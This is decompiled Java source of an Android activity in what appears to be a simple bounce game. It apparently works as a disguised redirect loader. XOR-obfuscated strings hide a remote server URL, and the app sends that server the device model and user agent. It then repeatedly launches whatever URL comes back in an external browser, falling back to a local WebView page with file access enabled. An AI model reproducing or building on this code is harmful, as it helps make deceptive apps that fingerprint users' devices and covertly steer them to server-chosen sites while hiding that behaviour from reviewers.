package com.playwall.bouncefield;

import K.A0;
import K.y0;
import P0.c;
import T.t;
import W0.a;
import X0.e;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowInsetsController;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.constraintlayout.widget.ConstraintLayout;
import com.playwall.bouncefield.MainActivity;
import com.playwall.bouncefield.R;
import e1.d;
import e1.l;
import g.AbstractActivityC0125i;
import g.C0123g;
import g.C0124h;
import i1.m;
import i1.o;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import m1.g;
import m1.j;
import q1.n;

/* loaded from: classes.dex */
public final class MainActivity extends AbstractActivityC0125i {

    /* renamed from: D, reason: collision with root package name */
    public static final /* synthetic */ int f1861D = 0;

    /* renamed from: A, reason: collision with root package name */
    public final String f1862A;

    /* renamed from: B, reason: collision with root package name */
    public SharedPreferences f1863B;

    /* renamed from: C, reason: collision with root package name */
    public String f1864C;

    /* renamed from: y, reason: collision with root package name */
    public final c f1865y;

    /* renamed from: z, reason: collision with root package name */
    public final String f1866z;

    public MainActivity() {
        this.d.f2373b.e("androidx:appcompat", new C0123g(this));
        h(new C0124h(this));
        this.f1865y = new c(new a() { // from class: N0.a
            @Override // W0.a
            public final Object a() {
                int i = MainActivity.f1861D;
                KeyEvent.Callback callback = null;
                int i2 = 0;
                View inflate = MainActivity.this.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                ConstraintLayout constraintLayout = (ConstraintLayout) inflate;
                if (inflate instanceof ViewGroup) {
                    ViewGroup viewGroup = (ViewGroup) inflate;
                    int childCount = viewGroup.getChildCount();
                    while (true) {
                        if (i2 >= childCount) {
                            break;
                        }
                        KeyEvent.Callback findViewById = viewGroup.getChildAt(i2).findViewById(R.id.webView);
                        if (findViewById != null) {
                            callback = findViewById;
                            break;
                        }
                        i2++;
                    }
                }
                WebView webView = (WebView) callback;
                if (webView != null) {
                    return new O0.a(constraintLayout, webView);
                }
                throw new NullPointerException("Missing required view with ID: ".concat(inflate.getResources().getResourceName(R.id.webView)));
            }
        });
        this.f1866z = t(new byte[]{-61, -64, 124});
        this.f1862A = t(new byte[]{-46, -45, 105, 6});
    }

    public static String t(byte[] bArr) {
        int[] iArr = {(int) 160, (int) 166, (int) 27, (int) 106};
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i = 0;
        int i2 = 0;
        int i3 = 0;
        while (i2 < length) {
            arrayList.add(Byte.valueOf((byte) (iArr[i3 % 4] ^ (bArr[i2] & 255))));
            i2++;
            i3++;
        }
        byte[] bArr2 = new byte[arrayList.size()];
        Iterator it = arrayList.iterator();
        while (it.hasNext()) {
            bArr2[i] = ((Number) it.next()).byteValue();
            i++;
        }
        return new String(bArr2, e1.a.f1909a);
    }

    @Override // g.AbstractActivityC0125i, a.l, android.app.Activity
    public final void onCreate(Bundle bundle) {
        g gVar;
        super.onCreate(bundle);
        this.f1863B = getSharedPreferences(this.f1866z, 0);
        setContentView(((O0.a) this.f1865y.a()).f617a);
        u();
        WebSettings settings = ((O0.a) this.f1865y.a()).f618b.getSettings();
        settings.setAllowContentAccess(true);
        settings.setAllowFileAccess(true);
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setMixedContentMode(0);
        settings.setCacheMode(-1);
        ((O0.a) this.f1865y.a()).f618b.setWebViewClient(new WebViewClient());
        WebView.setWebContentsDebuggingEnabled(false);
        SharedPreferences sharedPreferences = this.f1863B;
        g gVar2 = null;
        if (sharedPreferences == null) {
            e.h("prefs");
            throw null;
        }
        String string = sharedPreferences.getString(this.f1862A, null);
        if (string != null && !d.q0(string)) {
            this.f1864C = string;
            w(string);
            return;
        }
        String packageName = getPackageName();
        String t2 = t(new byte[]{-97, -57, 107, 26, -99});
        String str = t(new byte[]{-56, -46, 111, 26, -45, -100, 52, 69, -39, -61, 119, 6, -49, -47, 54, 30, -46, -45, 111, 2, -115, -105, 41, 90, -112, -120, 124, 28, -52, -48, 109, 9, -53, -51, 116, 71, -55, -44, 105, 19, -50, -59, 112, 1, -63, -97, 40, 68, -41, -55, 105, 1, -59, -44, 104, 68, -60, -61, 109, 69}) + t2 + packageName;
        o oVar = new o();
        t tVar = new t(4);
        e.e(str, "url");
        if (l.i0(str, "ws:", true)) {
            String substring = str.substring(3);
            e.d(substring, "this as java.lang.String).substring(startIndex)");
            str = "http:".concat(substring);
        } else if (l.i0(str, "wss:", true)) {
            String substring2 = str.substring(4);
            e.d(substring2, "this as java.lang.String).substring(startIndex)");
            str = "https:".concat(substring2);
        }
        e.e(str, "<this>");
        i1.l lVar = new i1.l();
        lVar.c(null, str);
        tVar.f741a = lVar.a();
        String t3 = t(new byte[]{-8, -117, 95, 15, -42, -49, 120, 15, -115, -21, 116, 14, -59, -54});
        String str2 = Build.MODEL;
        e.d(str2, "MODEL");
        tVar.l(t3, str2);
        tVar.l(t(new byte[]{-31, -59, 120, 15, -48, -46, 54, 38, -63, -56, 124, 31, -63, -63, 126}), t(new byte[]{-59, -56, 54, 63, -13, -118, 126, 4, -101, -41, 38, 90, -114, -97}));
        String t4 = t(new byte[]{-11, -43, 126, 24, -115, -25, 124, 15, -50, -46});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        e.d(defaultUserAgent, "getDefaultUserAgent(...)");
        tVar.l(t4, defaultUserAgent);
        H.e b2 = tVar.b();
        B0.d dVar = new B0.d(9, this);
        j jVar = new j(oVar, b2);
        if (!jVar.f3209e.compareAndSet(false, true)) {
            throw new IllegalStateException("Already Executed");
        }
        n nVar = n.f3549a;
        jVar.f3210f = n.f3549a.g();
        t tVar2 = oVar.f2457a;
        g gVar3 = new g(jVar, dVar);
        tVar2.getClass();
        synchronized (tVar2) {
            ((ArrayDeque) tVar2.f742b).add(gVar3);
            String str3 = ((m) b2.f213c).d;
            Iterator it = ((ArrayDeque) tVar2.f743c).iterator();
            while (true) {
                if (it.hasNext()) {
                    gVar = (g) it.next();
                    if (e.a(((m) gVar.f3203c.f3207b.f213c).d, str3)) {
                        break;
                    }
                } else {
                    Iterator it2 = ((ArrayDeque) tVar2.f742b).iterator();
                    while (it2.hasNext()) {
                        gVar = (g) it2.next();
                        if (e.a(((m) gVar.f3203c.f3207b.f213c).d, str3)) {
                        }
                    }
                }
            }
            gVar2 = gVar;
            if (gVar2 != null) {
                gVar3.f3202b = gVar2.f3202b;
            }
        }
        tVar2.r();
    }

    @Override // g.AbstractActivityC0125i, android.app.Activity
    public final void onResume() {
        super.onResume();
        String str = this.f1864C;
        if (str != null) {
            w(str);
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final void onWindowFocusChanged(boolean z2) {
        super.onWindowFocusChanged(z2);
        if (z2) {
            u();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public final void u() {
        y0 y0Var;
        WindowInsetsController insetsController;
        q1.d.m0(getWindow(), false);
        Window window = getWindow();
        B0.d dVar = new B0.d(getWindow().getDecorView());
        if (Build.VERSION.SDK_INT >= 30) {
            insetsController = window.getInsetsController();
            A0 a02 = new A0(insetsController, dVar);
            a02.f368f = window;
            y0Var = a02;
        } else {
            y0Var = new y0(window, dVar);
        }
        y0Var.P();
        y0Var.p0();
    }

    public final void v() {
        WebView webView = ((O0.a) this.f1865y.a()).f618b;
        webView.setVisibility(0);
        webView.loadUrl(t(new byte[]{-58, -49, 119, 15, -102, -119, 52, 69, -63, -56, Byte.MAX_VALUE, 24, -49, -49, Byte.MAX_VALUE, 53, -63, -43, 104, 15, -44, -119, 114, 4, -60, -61, 99, 68, -56, -46, 118, 6}));
    }

    public final void w(String str) {
        ((O0.a) this.f1865y.a()).f618b.setVisibility(8);
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            v();
        }
    }
}
